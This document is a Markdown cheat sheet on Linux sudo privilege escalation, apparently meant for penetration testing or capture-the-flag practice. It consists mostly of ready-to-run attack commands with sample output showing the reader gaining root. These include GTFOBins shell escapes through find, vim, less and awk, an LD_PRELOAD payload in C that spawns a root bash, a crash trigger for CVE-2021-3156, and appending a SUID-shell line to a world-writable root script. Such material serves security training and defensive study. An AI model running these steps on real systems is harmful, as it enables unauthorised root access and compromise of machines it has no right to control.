# SUDO

### Check sudo permissions

What can you run as root? — First thing to check always

```bash
sudo -l
```

<details>
<summary>Example Output</summary>

```
sudo -l
User www-data may run:
  (root) NOPASSWD: /usr/bin/vim
  (root) NOPASSWD: /usr/bin/find
  (ALL) NOPASSWD: /opt/backup.sh
(Check GTFOBins for vim and find)
```
</details>

---

### GTFOBins lookup

Abuse allowed binaries — BOOKMARK THIS SITE

```bash
https://gtfobins.github.io/
Search for each sudo binary
```

<details>
<summary>Example Output</summary>

```
sudo -l shows: (root) NOPASSWD: /usr/bin/find

GTFOBins: https://gtfobins.github.io/gtfobins/find/
Sudo: sudo find . -exec /bin/sh \; -quit

# whoami
root
```
</details>

---

### Sudo with no password

Run directly without password — Free root commands

```bash
If (NOPASSWD) in sudo -l output
```

<details>
<summary>Example Output</summary>

```
sudo -l
(root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!bash'
# whoami
root
(No password prompt = direct escalation)
```
</details>

---

### Sudo env_keep (LD_PRELOAD)

Hijack shared library loading — Runs your code as root

```bash
If env_keep+=LD_PRELOAD:
gcc -shared -fPIC -o /tmp/pe.so pe.c
sudo LD_PRELOAD=/tmp/pe.so <allowed_cmd>
```

<details>
<summary>Example Output</summary>

```
sudo -l shows: env_keep+=LD_PRELOAD

Compile:
#include <stdio.h>
void _init() { setuid(0); system("/bin/bash"); }

sudo LD_PRELOAD=/tmp/pe.so /usr/bin/allowed_command
# whoami
root
```
</details>

---

### Sudo version exploit

sudo &lt; 1.8.28 = CVE-2019-14287
sudo &lt; 1.9.5p2 = CVE-2021-3156 — Baron Samedit, etc

```bash
sudo --version
Search: sudo <version> exploit
```

<details>
<summary>Example Output</summary>

```
sudo --version
Sudo version 1.8.31

CVE-2021-3156 (Baron Samedit):
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): corrupted
(Vulnerable! Use exploit for root)
```
</details>

---

### Sudo with shell escape

Many programs have shell escapes — Check GTFOBins for each binary

```bash
sudo vim -> :!sh
sudo less -> !sh
sudo man -> !sh
sudo awk 'BEGIN {system("/bin/sh")}'
```

<details>
<summary>Example Output</summary>

```
sudo vim -c ':!sh'

# whoami
root
(Escaped to root shell via vim)
```
</details>

---

### Sudo script injection

Edit the script, add reverse shell — Writable scripts run as root

```bash
If sudo allows running a script you can modify
```

<details>
<summary>Example Output</summary>

```
sudo -l: (root) /opt/backup.sh

ls -la /opt/backup.sh
-rwxrwxrwx 1 root root  <- WORLD WRITABLE!

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
sudo /opt/backup.sh
/tmp/rootbash -p
# whoami
root
```
</details>

---
